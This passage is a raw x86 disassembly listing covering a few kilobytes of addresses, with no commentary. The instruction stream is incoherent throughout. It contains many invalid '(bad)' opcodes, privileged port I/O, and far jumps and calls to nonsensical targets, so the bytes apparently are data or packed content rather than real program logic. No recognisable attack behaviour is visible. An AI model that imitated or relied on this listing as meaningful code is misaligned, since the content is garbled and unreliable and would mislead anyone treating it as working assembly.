  401fc7:	sbb    DWORD PTR [esi-0x5f],ebp
  401fca:	sbb    edx,DWORD PTR [edi+0x20]
  401fcd:	jae    0x401ffc
  401fcf:	pop    esp
  401fd0:	add    ah,BYTE PTR [edi-0x32]
  401fd3:	xlat   BYTE PTR ds:[ebx]
  401fd4:	push   ss
  401fd5:	outs   dx,BYTE PTR ds:[esi]
  401fd6:	xor    DWORD PTR [edi+eax*1],esi
  401fd9:	inc    ecx
  401fda:	cmp    esi,DWORD PTR [ecx+0x35]
  401fdd:	out    dx,eax
  401fde:	jns    0x40202e
  401fe0:	dec    edi
  401fe1:	xlat   BYTE PTR ds:[ebx]
  401fe2:	xor    bh,dh
  401fe4:	jnp    0x401ffb
  401fe6:	pop    edx
  401fe7:	mov    ch,0x56
  401fe9:	xor    BYTE PTR [ecx],dl
  401feb:	adc    dl,bl
  401fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fee:	pop    edi
  401fef:	cmc    
  401ff0:	hlt    
  401ff1:	stc    
  401ff2:	outs   dx,BYTE PTR ds:[esi]
  401ff3:	fiadd  WORD PTR [ecx+esi*1-0x70]
  401ff7:	dec    esp
  401ff8:	cmp    al,bl
  401ffa:	jmp    0x84c4:0xe0bea12b
  402001:	cmp    BYTE PTR es:[ebx],bh
  402004:	in     al,dx
  402005:	ins    DWORD PTR es:[edi],dx
  402006:	int3   
  402007:	imul   edi,DWORD PTR [ebx+0xa],0xd74ae248
  40200e:	sub    BYTE PTR ds:0xf0cdf8fb,al
  402014:	pop    esp
  402015:	push   esp
  402016:	lds    ebx,FWORD PTR [edx-0x44795d7c]
  40201c:	into   
  40201d:	xchg   esi,eax
  40201e:	sbb    esp,DWORD PTR [ecx+0x38]
  402021:	adc    ah,0xce
  402024:	cli    
  402025:	and    dl,ah
  402027:	adc    al,0x84
  402029:	sub    DWORD PTR ds:0x8c28ede8,ebp
  40202f:	in     eax,dx
  402030:	jmp    0x61dc:0x95a793c4
  402037:	test   DWORD PTR [ebx+0x31],ecx
  40203a:	js     0x402033
  40203c:	sahf   
  40203d:	adc    eax,0xcd57a3e1
  402042:	inc    eax
  402043:	xor    al,0x8b
  402045:	nop
  402046:	push   ebp
  402047:	ins    DWORD PTR es:[edi],dx
  402048:	icebp  
  402049:	aad    0x1
  40204b:	sub    cl,BYTE PTR [eax]
  40204d:	fnstsw WORD PTR [edi-0x4ca5bec3]
  402053:	stc    
  402054:	std    
  402055:	sbb    esi,DWORD PTR [edx+0x6e864484]
  40205b:	mov    ds:0x2cc7d9f8,eax
  402060:	sub    edx,DWORD PTR [esi+esi*4+0x4b21d0e8]
  402067:	scas   eax,DWORD PTR es:[edi]
  402068:	leave  
  402069:	(bad)  
  40206a:	dec    esi
  40206b:	mov    ebp,0x399e0a45
  402070:	xchg   ecx,eax
  402071:	xchg   ecx,eax
  402072:	jbe    0x4020a1
  402074:	lock push 0xffffffae
  402077:	xchg   edx,eax
  402078:	cmp    BYTE PTR [edx-0x3c0a9939],0x55
  40207f:	mov    WORD PTR [ebx-0x80],es
  402082:	cld    
  402083:	inc    DWORD PTR [ecx]
  402085:	inc    edi
  402086:	pusha  
  402087:	adc    al,0xec
  402089:	dec    esp
  40208a:	add    BYTE PTR [ecx],bl
  40208c:	sub    DWORD PTR [edx],esp
  40208e:	dec    esi
  40208f:	rol    BYTE PTR [ebp+0x28ce9789],0x3b
  402096:	call   0xbc4f5583
  40209b:	cmp    ch,dl
  40209d:	cli    
  40209e:	mov    al,0x6d
  4020a0:	jne    0x402111
  4020a2:	jne    0x402068
  4020a4:	sub    al,0x6
  4020a6:	dec    edx
  4020a7:	aaa    
  4020a8:	pop    ecx
  4020aa:	adc    eax,0x76334421
  4020af:	add    BYTE PTR [ecx],0xfa
  4020b2:	or     al,0x0
  4020b4:	imul   edx,DWORD PTR [ecx-0x3734e131],0xa8d79263
  4020be:	xchg   esi,eax
  4020bf:	jge    0x4020c0
  4020c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020c2:	repnz sti 
  4020c4:	push   ecx
  4020c5:	out    0xc9,al
  4020c7:	xor    BYTE PTR [eax],dl
  4020c9:	ins    DWORD PTR es:[edi],dx
  4020ca:	test   BYTE PTR [edx+0x14],0xef
  4020ce:	retf   
  4020cf:	mov    BYTE PTR [eax-0xcc83],0x54
  4020d6:	fistp  WORD PTR [esi]
  4020d8:	add    BYTE PTR ds:0x66c836e1,0xa0
  4020df:	push   cs
  4020e0:	mov    esi,0x524f2bac
  4020e5:	push   ds
  4020e6:	cmp    esp,DWORD PTR [ebp+0x3895f2b2]
  4020ec:	imul   DWORD PTR [edx+0x5e]
  4020ef:	into   
  4020f0:	das    
  4020f1:	xor    esi,DWORD PTR [ebx-0x1a0fa9ac]
  4020f7:	aaa    
  4020f8:	add    DWORD PTR [eax+0x20],ebp
  4020fb:	xchg   ecx,eax
  4020fc:	xchg   esi,eax
  4020fd:	mov    ebp,0x2c86b569
  402102:	ss std 
  402104:	dec    esi
  402105:	mov    al,ds:0xfbbe9a57
  40210a:	js     0x4020e5
  40210c:	push   0x21
  40210e:	push   ebx
  40210f:	fsubr  QWORD PTR [ebx-0xceba13d]
  402115:	mov    ds:0x1a005987,al
  40211a:	pop    esi
  40211b:	in     eax,0x1
  40211d:	cmp    al,BYTE PTR [edx+0x4e]
  402120:	push   ss
  402121:	lds    edx,FWORD PTR [ecx+0x402373e6]
  402127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402128:	ins    BYTE PTR es:[edi],dx
  402129:	inc    ebx
  40212a:	inc    edx
  40212b:	stos   BYTE PTR es:[edi],al
  40212c:	outs   dx,DWORD PTR ds:[esi]
  40212d:	daa    
  40212e:	mov    dl,0x19
  402130:	mov    eax,ds:0xd9a61234
  402135:	jecxz  0x4021a1
  402137:	adc    BYTE PTR [esi+0x2dd76fb3],dl
  40213d:	mov    dh,0x13
  40213f:	pop    edx
  402140:	ds jle 0x402147
  402143:	add    al,0x85
  402145:	jae    0x40212a
  402147:	xchg   ecx,eax
  402148:	scas   al,BYTE PTR es:[edi]
  402149:	mov    esp,0x36107c12
  40214e:	imul   ecx,DWORD PTR [esi],0x52e11392
  402154:	call   0x2b7b3fbc
  402159:	jae    0x402179
  40215b:	dec    ebp
  40215c:	mov    ebp,0x947f535e
  402161:	sar    DWORD PTR [eax],1
  402163:	fldenv [edi]
  402165:	mov    ds:0x509c9698,eax
  40216a:	mov    ds:0x19f4160b,eax
  40216f:	sbb    BYTE PTR [eax],cl
  402171:	mov    ebx,0x2f0f3a64
  402176:	fwait
  402177:	mov    ecx,0xd0400481
  40217c:	sbb    DWORD PTR [ecx-0x7f805634],ecx
  402182:	ret    
  402183:	add    BYTE PTR [edx-0x35],0x9e
  402187:	push   es
  402188:	pop    edi
  402189:	push   esi
  40218a:	(bad)  
  40218b:	cwde   
  40218c:	call   DWORD PTR [edx]
  40218e:	outs   dx,BYTE PTR ds:[esi]
  40218f:	enter  0xed59,0x7c
  402193:	push   es
  402194:	jl     0x4021e5
  402196:	xchg   esi,eax
  402197:	mov    ds:0xa7c24b93,al
  40219c:	out    0x12,ax
  40219f:	repz adc ch,BYTE PTR [ebp-0x72]
  4021a3:	ja     0x40220b
  4021a5:	mov    ebp,0xe3e02fdc
  4021aa:	sub    bh,BYTE PTR [edx-0x2c]
  4021ad:	jmp    FWORD PTR [eax+0x49b270a7]
  4021b3:	xchg   esp,eax
  4021b4:	int3   
  4021b5:	inc    eax
  4021b6:	jbe    0x4021fa
  4021b8:	add    al,0x51
  4021ba:	push   edx
  4021bb:	fnstcw WORD PTR [ebx-0x30d5b4f2]
  4021c1:	xchg   BYTE PTR [edi+0x63],ch
  4021c4:	dec    eax
  4021c5:	cmp    DWORD PTR [edx-0x1978693d],edx
  4021cb:	jge    0x4021f4
  4021cd:	mov    BYTE PTR [esi],al
  4021cf:	xchg   ebp,eax
  4021d0:	and    al,0x4a
  4021d2:	pushf  
  4021d3:	mov    al,ds:0xd336a429
  4021d8:	dec    esp
  4021d9:	adc    ebx,DWORD PTR [edi+0x51]
  4021dc:	mov    dh,0x6b
  4021de:	dec    ebx
  4021df:	dec    ebp
  4021e0:	mov    esi,0xa3d78faf
  4021e5:	jmp    0x43f1b22d
  4021ea:	or     eax,0x864b5115
  4021ef:	xor    BYTE PTR [ecx-0x38fa31f2],bh
  4021f5:	add    cl,dl
  4021f7:	sub    dh,BYTE PTR [ebx+0x27]
  4021fa:	jle    0x4021af
  4021fc:	js     0x4021a8
  4021fe:	xchg   ah,dh
  402200:	mov    ch,0xd9
  402202:	inc    ebx
  402203:	lea    edi,[ebp+edx*1-0x6377a888]
  40220a:	jmp    0x4021fb
  40220c:	mov    ah,0x72
  40220e:	cwde   
  40220f:	or     al,0xc
  402211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402212:	add    bh,al
  402214:	pop    edx
  402215:	mov    eax,fs:0xa4ebc4cb
  40221b:	xor    DWORD PTR [edx+0x7b],ebp
  40221e:	and    ebx,DWORD PTR [ebp-0x1f6edcf1]
  402224:	out    dx,al
  402225:	hlt    
  402226:	and    ch,BYTE PTR [edx]
  402228:	mov    dh,0x78
  40222a:	(bad)  
  40222c:	test   al,0x49
  40222e:	mov    esi,0xde7b5c9c
  402233:	lahf   
  402234:	cmp    eax,0x65b61c
  402239:	adc    eax,0xef255dfa
  40223e:	call   0x793e0b82
  402243:	pop    ecx
  402244:	sub    bl,BYTE PTR [di]
  402247:	and    eax,ebp
  402249:	popf   
  40224a:	nop
  40224b:	jecxz  0x402250
  40224d:	add    dh,ch
  40224f:	inc    eax
  402250:	sub    bl,BYTE PTR [ebp+0x8]
  402253:	sbb    BYTE PTR [ebx-0x4faf1348],ah
  402259:	add    al,0x91
  40225b:	into   
  40225c:	fiadd  DWORD PTR [esi]
  40225e:	pop    ss
  40225f:	gs mov al,cs:0x1cc42812
  402266:	in     eax,0x4e
  402268:	(bad)  
  402269:	(bad)  
  40226a:	out    0x41,eax
  40226c:	cdq    
  40226d:	pop    edx
  40226e:	jne    0x40222f
  402270:	sbb    DWORD PTR [ecx],esi
  402272:	call   0x5e39:0x6182d62e
  402279:	(bad)  
  40227a:	(bad)  
  40227b:	ror    DWORD PTR [ebx+0x61],1
  40227e:	pop    eax
  40227f:	fsubr  st(6),st
  402281:	lds    ebx,FWORD PTR [edi+ebx*8]
  402284:	fld    TBYTE PTR [esi-0x49acf755]
  40228a:	shr    DWORD PTR [esi],0x93
  40228d:	aad    0xc2
  40228f:	(bad)  
  402290:	mov    ds:0xa55ae67c,al
  402295:	xor    dl,BYTE PTR [ecx+0x2a]
  402298:	mov    ch,0x1f
  40229a:	cmp    DWORD PTR [eax+ebx*8-0x6],ebx
  40229e:	cmp    edx,DWORD PTR [edx-0x1a77608c]
  4022a4:	pushf  
  4022a5:	call   0x111ec598
  4022aa:	pop    edi
  4022ab:	(bad)  
  4022ac:	daa    
  4022ad:	push   esi
  4022ae:	dec    edi
  4022af:	jne    0x4022b7
  4022b1:	sbb    al,0x3c
  4022b3:	(bad)  
  4022b4:	mov    dl,0xfc
  4022b6:	mov    ah,0x2b
  4022b8:	jb     0x4022de
  4022ba:	shr    DWORD PTR [eax+eax*4+0x355caded],0x61
  4022c2:	mov    ds:0xa1793e96,eax
  4022c7:	sbb    ch,ah
  4022c9:	mov    esp,0xfd63070
  4022ce:	mov    ah,0x99
  4022d0:	cli    
  4022d1:	cmp    esi,ecx
  4022d3:	xor    cl,BYTE PTR ds:0x28141d77
  4022d9:	mov    bl,0xab
  4022db:	inc    ecx
  4022dc:	xor    esi,DWORD PTR [eax-0x616c2b31]
  4022e2:	xchg   edx,eax
  4022e3:	xlat   BYTE PTR ds:[ebx]
  4022e4:	fcomp  QWORD PTR [eax-0x17]
  4022e7:	int    0xad
  4022e9:	inc    esp
  4022ea:	jecxz  0x40233e
  4022ec:	test   ebx,ebp
  4022ee:	sub    DWORD PTR [edx+0xe],0xbf4a9de3
  4022f5:	ins    DWORD PTR es:[edi],dx
  4022f6:	pop    esi
  4022f7:	rol    BYTE PTR [esi+0x378fc5b4],cl
  4022fd:	xchg   esp,eax
  4022fe:	int    0x2e
  402300:	cmp    DWORD PTR [ebx-0x79],esi
  402303:	inc    ebx
  402304:	dec    ecx
  402305:	cmp    eax,0xdfce5002
  40230a:	hlt    
  40230b:	inc    ecx
  40230c:	(bad)  ss:[eax+0x133b2d5a]
  402313:	retf   
  402314:	jge    0x4022a3
  402316:	call   0x961d:0x9328d29d
  40231d:	stc    
  40231e:	fcmovnbe st,st(3)
  402320:	test   al,0xb8
  402322:	nop
  402323:	mov    BYTE PTR [esi+0x600543d1],bh
  402329:	cs pusha 
  40232b:	out    dx,eax
  40232c:	and    ch,ah
  40232e:	or     BYTE PTR [ecx],bl
  402330:	aaa    
  402331:	scas   al,BYTE PTR es:[edi]
  402332:	das    
  402333:	mov    eax,0x612156f5
  402338:	sahf   
  402339:	mov    ds:0x25771511,eax
  40233e:	pop    edx
  40233f:	ds jbe 0x402367
  402342:	sub    ebp,DWORD PTR [ebp*4-0x3f70436f]
  402349:	(bad)  
  40234b:	xor    eax,0x1c367128
  402350:	mov    esp,0x2f1dcefc
  402355:	xor    bl,BYTE PTR [ecx+0x19]
  402358:	inc    eax
  402359:	enter  0x244d,0x37
  40235d:	bound  ecx,QWORD PTR [edx]
  40235f:	hlt    
  402360:	adc    bh,BYTE PTR [ebp-0x4ed78238]
  402366:	add    bl,BYTE PTR [edx+0x7260de48]
  40236c:	xchg   edx,eax
  40236d:	jae    0x40235e
  40236f:	xor    DWORD PTR [ebx-0x4bcf9e35],ebp
  402375:	push   ebp
  402376:	addr16 icebp 
  402378:	sbb    BYTE PTR [ebp+0x563ecf75],ah
  40237e:	std    
  40237f:	jl     0x40238b
  402381:	add    DWORD PTR [ebx-0x6a8e8ec8],ebx
  402387:	lock sbb cl,dh
  40238a:	mov    ah,0x95
  40238c:	test   bl,cl
  40238e:	retf   0x94c8
  402391:	jnp    0x402317
  402393:	sub    DWORD PTR [edx-0x6b3032a9],ecx
  402399:	add    eax,0x1110821
  40239e:	fimul  WORD PTR cs:[esi+0x6b]
  4023a2:	mov    ds:0x939ab182,al
  4023a7:	aad    0xae
  4023a9:	jmp    0x7a26233a
  4023ae:	push   es
  4023af:	and    BYTE PTR [esi],dh
  4023b1:	add    edi,DWORD PTR [ebp-0x1f64812b]
  4023b7:	jne    0x4023c2
  4023b9:	xchg   ebp,eax
  4023ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023bb:	xor    ah,BYTE PTR [esi+0x5e111bd3]
  4023c1:	out    dx,eax
  4023c2:	gs sub edx,ecx
  4023c5:	pop    edx
  4023c6:	pop    ebx
  4023c7:	mov    cl,ch
  4023c9:	(bad)  
  4023ca:	mov    dl,0xdd
  4023cc:	jp     0x4023ac
  4023ce:	xor    BYTE PTR [ebp-0x45947ac1],al
  4023d4:	sub    BYTE PTR es:[esi],bl
  4023d7:	inc    esi
  4023d8:	or     DWORD PTR [esi+0x2ff4d4c2],edx
  4023de:	sub    DWORD PTR [eax],0x18
  4023e1:	into   
  4023e2:	xlat   BYTE PTR ds:[ebx]
  4023e3:	dec    esi
  4023e4:	in     eax,0xca
  4023e6:	xchg   esi,eax
  4023e7:	aaa    
  4023e8:	push   ecx
  4023e9:	and    al,0x45
  4023eb:	out    0x3e,eax
  4023ed:	xchg   esi,eax
  4023ee:	test   eax,0xe1231d76
  4023f3:	out    dx,eax
  4023f4:	and    al,0xa1
  4023f6:	neg    dl
  4023f8:	ret    0xb098
  4023fb:	mov    edx,0xd45fb8ad
  402400:	mov    cl,0xeb
  402402:	push   esp
  402403:	adc    al,0xe7
  402405:	pusha  
  402406:	pop    eax
  402407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402408:	push   ebp
  402409:	mov    eax,ds:0xcde68617
  40240e:	jecxz  0x402488
  402410:	dec    ebp
  402411:	cmp    al,0x23
  402413:	xchg   BYTE PTR [ebx+eiz*8-0x7],bl
  402417:	fnop   
  402419:	jle    0x40243f
  40241b:	dec    ecx
  40241c:	aam    0x18
  40241e:	mov    dl,0xfb
  402420:	adc    eax,0x309ab1a
  402425:	sbb    al,0xd5
  402427:	or     ecx,ebx
  402429:	jle    0x402420
  40242b:	xchg   ebp,eax
  40242c:	adc    ch,BYTE PTR [ebp-0x14]
  40242f:	ins    BYTE PTR es:[edi],dx
  402430:	inc    ebx
  402431:	or     eax,0xf2a3e7f7
  402436:	or     ebp,DWORD PTR [edi-0x506fee1a]
  40243c:	aaa    
  40243d:	cli    
  40243e:	lahf   
  40243f:	test   al,0xe0
  402441:	pop    eax
  402442:	add    eax,DWORD PTR [eax]
  402444:	mov    edx,0xd0ad5ffc
  402449:	mov    edx,0x9ac0a7e5
  40244e:	stc    
  40244f:	or     BYTE PTR [ecx],dl
  402451:	push   cs
  402452:	sbb    dh,BYTE PTR [esi]
  402454:	lock push 0xffffffa5
  402457:	mov    ah,0x2c
  402459:	jp     0x402442
  40245b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40245c:	out    dx,al
  40245d:	jle    0x40247c
  40245f:	shl    DWORD PTR [esp+ecx*4],cl
  402462:	jp     0x4023fb
  402464:	scas   al,BYTE PTR es:[edi]
  402465:	enter  0x18aa,0x2c
  402469:	and    ebp,ebx
  40246b:	sub    bl,ah
  40246d:	(bad)  
  40246e:	ins    BYTE PTR es:[edi],dx
  40246f:	shr    ah,cl
  402471:	sbb    ah,dh
  402473:	push   eax
  402474:	mov    al,ds:0xc8387ca6
  402479:	fldcw  WORD PTR ds:0xf79c0e84
  40247f:	aam    0x14
  402481:	dec    edi
  402482:	push   es
  402483:	sub    ch,BYTE PTR [esi+0x9]
  402486:	mov    ch,0xc3
  402488:	test   al,0x3e
  40248a:	popa   
  40248b:	xchg   ecx,eax
  40248c:	fs push es
  40248e:	sbb    esi,esp
  402490:	jnp    0x4024d2
  402492:	cld    
  402493:	icebp  
  402494:	mov    dl,0x2f
  402496:	ins    DWORD PTR es:[edi],dx
  402497:	fcomp  QWORD PTR ds:0x6ead5088
  40249d:	mov    ds:0xab4413dc,eax
  4024a2:	sbb    al,0xdb
  4024a4:	clc    
  4024a5:	jne    0x40243f
  4024a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024a8:	adc    al,0x49
  4024aa:	jmp    0x402468
  4024ac:	push   ebp
  4024ad:	push   edx
  4024ae:	jp     0x402434
  4024b0:	ss ds mov al,0x30
  4024b4:	push   ebp
  4024b5:	cmp    cl,BYTE PTR [ebp+0x6c]
  4024b8:	cmp    DWORD PTR [eax-0xa],esp
  4024bb:	cmp    BYTE PTR [ecx],0xab
  4024be:	lods   eax,DWORD PTR ds:[esi]
  4024bf:	rcr    DWORD PTR [ebx-0x1eba80d5],1
  4024c5:	xor    ebp,ebx
  4024c7:	jae    0x4024c9
  4024c9:	lds    esi,FWORD PTR cs:[edx+0x3b]
  4024cd:	cli    
  4024ce:	cs adc al,0x79
  4024d1:	arpl   WORD PTR [eax+0x16e9fc54],ax
  4024d7:	dec    esi
  4024d8:	mov    dl,BYTE PTR [esi-0xac78c13]
  4024de:	dec    edx
  4024df:	std    
  4024e0:	xchg   edi,eax
  4024e1:	sar    ah,1
  4024e3:	mov    ebx,0x20bd2df1
  4024e8:	lea    ecx,[esi]
  4024ea:	ret    
  4024eb:	mov    dl,0x1f
  4024ee:	ss scas eax,DWORD PTR es:[edi]
  4024f0:	mov    al,ds:0x630ff321
  4024f5:	mov    ecx,0xbc667953
  4024fa:	mov    dh,BYTE PTR [ebx]
  4024fc:	inc    eax
  4024fd:	ins    DWORD PTR es:[edi],dx
  4024fe:	and    al,0x64
  402500:	rcr    eax,1
  402502:	idiv   edx
  402504:	add    BYTE PTR [ecx+0x19],0x8b
  402508:	mov    BYTE PTR [edi-0x6c],bl
  40250b:	or     ah,BYTE PTR [ebp+0x7d]
  40250e:	cdq    
  40250f:	out    0x56,al
  402511:	js     0x402569
  402513:	and    BYTE PTR gs:[esi],0xc6
  402517:	inc    esp
  402518:	jmp    0x402501
  40251a:	jne    0x4024b4
  40251c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40251d:	aad    0x97
  40251f:	mov    dl,0x8c
  402521:	ins    BYTE PTR es:[edi],dx
  402522:	int    0x57
  402524:	lods   al,BYTE PTR ds:[esi]
  402525:	out    0xca,eax
  402527:	ficomp DWORD PTR [ecx+0x73b008b2]
  40252d:	sar    DWORD PTR ds:0x7d1373d2,cl
  402533:	adc    BYTE PTR [edi],ah
  402535:	pop    ss
  402536:	in     al,0x54
  402538:	fwait
  402539:	stos   DWORD PTR es:[edi],eax
  40253a:	and    DWORD PTR [esi+0x7],edi
  40253d:	sub    esi,DWORD PTR [edx+0x2b]
  402540:	dec    esi
  402541:	xchg   ebx,eax
  402542:	(bad)  
  402544:	(bad)  
  402545:	call   0xe23e9444
  40254a:	dec    ebx
  40254b:	or     DWORD PTR [ebp-0x12eac9d9],ebx
  402551:	out    dx,al
  402552:	sub    BYTE PTR [ebp+ecx*4-0xa4df744],dh
  402559:	push   edx
  40255a:	cld    
  40255b:	(bad)  
  40255c:	loopne 0x4024e1
  40255e:	pop    ecx
  40255f:	xchg   edi,eax
  402560:	inc    edi
  402561:	in     al,dx
  402562:	jl     0x402596
  402564:	jo     0x40254f
  402566:	push   edx
  402567:	push   ds
  402568:	mov    eax,ds:0x8eec4b5d
  40256d:	fucomi st,st(3)
  40256f:	sahf   
  402570:	mov    dl,BYTE PTR [eax+eax*4]
  402573:	std    
  402574:	scas   eax,DWORD PTR es:[edi]
  402575:	push   esp
  402576:	arpl   WORD PTR [eax-0x80],bx
  402579:	xor    ecx,DWORD PTR [ebx-0x5b38d6fa]
  40257f:	lods   al,BYTE PTR ds:[esi]
  402580:	xor    DWORD PTR [ecx-0x4cc25d6f],esp
  402586:	pop    ecx
  402587:	jmp    0x11dd0708
  40258c:	mov    bl,0x58
  40258e:	mov    esi,0xaabbe1a2
  402593:	es or  eax,0x70faaad9
  402599:	push   es
  40259a:	data16 into 
  40259c:	jb     0x402614
  40259e:	std    
  40259f:	cwde   
  4025a0:	and    ah,dl
  4025a2:	pop    esp
  4025a3:	rol    BYTE PTR [edi-0x73b7c15e],0x38
  4025aa:	addr16 aas 
  4025ac:	rol    cl,1
  4025ae:	mov    ds:0xc183fc43,al
  4025b3:	dec    edx
  4025b4:	imul   edx,DWORD PTR [edx-0x2f914356],0x1833d5d2
  4025be:	fcmovnbe st,st(7)
  4025c0:	jp     0x4025a0
  4025c2:	(bad)  
  4025c3:	(bad)  
  4025c4:	xchg   ecx,eax
  4025c5:	inc    esi
  4025c6:	inc    esp
  4025c7:	dec    edx
  4025c8:	lods   al,BYTE PTR ds:[esi]
  4025c9:	push   ebx
  4025ca:	and    edi,DWORD PTR [ecx-0x658734b]
  4025d0:	(bad)  
  4025d1:	mov    ds:0x3f9f51c5,eax
  4025d6:	cmp    cl,dl
  4025d8:	pop    ecx
  4025d9:	sbb    al,0xf
  4025db:	jne    0x4025c6
  4025dd:	cmp    dh,BYTE PTR [ebp-0x2a]
  4025e0:	dec    ecx
  4025e1:	fistp  QWORD PTR [ecx-0x3010515]
  4025e7:	loop   0x4025ea
  4025e9:	cld    
  4025ea:	cmp    al,0x29
  4025ec:	dec    ebp
  4025ed:	pop    ss
  4025ee:	cmc    
  4025ef:	sti    
  4025f0:	daa    
  4025f1:	mov    ds:0xe7e64dc,al
  4025f6:	and    al,0x2c
  4025f8:	bound  eax,QWORD PTR [edi]
  4025fa:	inc    ebx
  4025fb:	mov    ah,0x27
  4025fd:	cmp    eax,0xdcdfd1bc
  402602:	jne    0x40260c
  402604:	mov    al,ds:0x8e053f82
  402609:	pop    esi
  40260a:	not    eax
  40260c:	dec    ebp
  40260d:	ds int 0x9c
  402610:	adc    DWORD PTR [edx],0x75
  402613:	adc    BYTE PTR ds:0xa593bdcd,cl
  402619:	in     eax,0xb
  40261b:	dec    eax
  40261c:	scas   eax,DWORD PTR es:[edi]
  40261d:	or     al,0xe0
  40261f:	test   al,0xe0
  402621:	xor    ah,BYTE PTR [ebp+esi*8+0x6a]
  402625:	push   edi
  402626:	xchg   BYTE PTR [ebp+0x3264842b],dl
  40262c:	push   0xffffffd7
  40262e:	ds pop esi
  402630:	sti    
  402631:	dec    eax
  402632:	nop
  402633:	jns    0x40268b
  402635:	inc    ecx
  402636:	cmc    
  402637:	inc    ebx
  402638:	icebp  
  402639:	jo     0x40260e
  40263b:	dec    esi
  40263c:	mov    ah,0x8d
  40263e:	dec    esi
  40263f:	mov    dh,0xc
  402641:	inc    edx
  402642:	fsub   QWORD PTR [ecx-0x16c02c54]
  402648:	(bad)  
  402649:	adc    al,0x9
  40264b:	imul   BYTE PTR [edx+edx*1-0x2f]
  40264f:	test   eax,0xe82c5e63
  402654:	push   0xd16b2f2d
  402659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40265a:	punpcklwd mm1,DWORD PTR [edi]
  40265d:	add    ecx,DWORD PTR [eax]
  40265f:	pop    ebx
  402660:	out    0x24,eax
  402662:	sbb    esi,DWORD PTR [ebp-0x5d]
  402665:	mov    esi,0x9be13f4b
  40266a:	mov    ch,0x5e
  40266c:	jo     0x402624
  40266e:	sar    dh,1
  402670:	inc    edi
  402671:	clc    
  402672:	in     eax,0xf7
  402674:	dec    ecx
  402675:	sub    eax,0xfc947c2f
  40267a:	cmp    bh,bh
  40267c:	or     esi,DWORD PTR [esi+0x3c]
  40267f:	lea    ebx,[ecx-0x56146b01]
  402685:	fdiv   QWORD PTR [edi+0x16]
  402688:	mov    al,ds:0x8e2715f6
  40268d:	mov    al,ds:0x57c74c1d
  402692:	lock arpl WORD PTR [edx],bp
  402695:	es aas 
  402697:	retf   0x5e52
  40269a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40269b:	add    eax,0xfdcf53f
  4026a0:	and    esi,DWORD PTR [ebp+0x69f5b363]
  4026a6:	xchg   ecx,eax
  4026a7:	stos   DWORD PTR es:[edi],eax
  4026a8:	cs push cs
  4026aa:	xchg   BYTE PTR [edx+0x426b5dbb],al
  4026b0:	outs   dx,DWORD PTR ds:[esi]
  4026b1:	addr16 push 0x95e1ac3d
  4026b7:	rcr    ecx,cl
  4026b9:	xchg   ecx,eax
  4026ba:	mov    ch,0x36
  4026bc:	lahf   
  4026bd:	fwait
  4026be:	pop    ebx
  4026bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026c0:	enter  0xcb94,0xc5
  4026c4:	pop    ecx
  4026c5:	sub    al,0xd0
  4026c7:	pop    ecx
  4026c8:	xor    edi,ebx
  4026ca:	add    al,0xa3
  4026cc:	or     eax,0x6bf57e9d
  4026d1:	sahf   
  4026d2:	xor    DWORD PTR [esi],edi
  4026d4:	mov    bl,0x32
  4026d6:	inc    ebx
  4026d7:	lahf   
  4026d8:	pop    esi
  4026d9:	and    al,0x1e
  4026db:	imul   ebx,DWORD PTR [ebx+0x49],0xc05d2dcc
  4026e2:	push   ss
  4026e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026e4:	loopne 0x40266e
  4026e6:	test   BYTE PTR [edx],dl
  4026e8:	sub    DWORD PTR [eax],esp
  4026ea:	pop    ss
  4026eb:	(bad)  
  4026ec:	retf   
  4026ed:	pop    es
  4026ee:	jge    0x9a0540a
  4026f4:	pushf  
  4026f5:	popa   
  4026f6:	mov    al,0x18
  4026f8:	shr    dl,1
  4026fa:	xchg   ebp,ecx
  4026fc:	mul    edx
  4026fe:	xor    eax,0xbc3e5f8e
  402703:	pop    ds
  402704:	std    
  402705:	mov    BYTE PTR [ecx-0x6d899b85],al
  40270b:	loope  0x402722
  40270d:	push   cs
  40270e:	(bad)  
  40270f:	in     al,0x86
  402711:	out    0x79,al
  402713:	push   esp
  402714:	push   cs
  402715:	sbb    al,0x15
  402717:	add    eax,0x7061c01e
  40271c:	lds    edi,FWORD PTR [ecx-0x50]
  40271f:	loopne 0x402776
  402721:	push   ds
  402722:	mov    edx,0x86e2a8c5
  402727:	lahf   
  402728:	jns    0x4026dc
  40272a:	clc    
  40272b:	rcr    DWORD PTR [ebx+0xff219ca],cl
  402731:	mov    ds:0xad672840,eax
  402736:	(bad)  
  402737:	scas   al,BYTE PTR es:[edi]
  402738:	pop    eax
  402739:	pop    ebp
  40273a:	mov    bl,0xca
  40273c:	pop    ebx
  40273d:	inc    esp
  40273e:	dec    edx
  40273f:	push   0x52
  402741:	and    cl,BYTE PTR [ebp+ebp*1+0x75603af3]
  402748:	mov    ebp,0xe763ea23
  40274d:	push   ebp
  40274e:	xchg   esp,eax
  40274f:	mov    bl,0xa3
  402751:	jle    0x402769
  402753:	dec    edx
  402754:	xchg   ebx,eax
  402755:	mov    al,0xc
  402757:	pop    edx
  402758:	ror    DWORD PTR [eax+0x4039a856],cl
  40275e:	or     eax,0x9c5959e6
  402763:	push   ebp
  402764:	adc    BYTE PTR [esi],dh
  402766:	bound  ecx,QWORD PTR [eax-0x21]
  402769:	mov    ah,0x8f
  40276b:	jo     0x40277a
  40276d:	pusha  
  40276e:	pop    esi
  40276f:	ret    
  402770:	cwde   
  402771:	push   cs
  402772:	pop    esp
  402773:	pop    edx
  402774:	xchg   esi,eax
  402775:	or     ebp,DWORD PTR [ebx-0x1f85c073]
  40277b:	ret    
  40277c:	int    0xf4
  40277e:	cld    
  40277f:	and    eax,0xc1803f41
  402784:	or     al,0xe9
  402786:	mov    DWORD PTR [edi-0x1923c49f],esp
  40278c:	mov    esp,0xf7e81d99
  402791:	es xor al,0x2
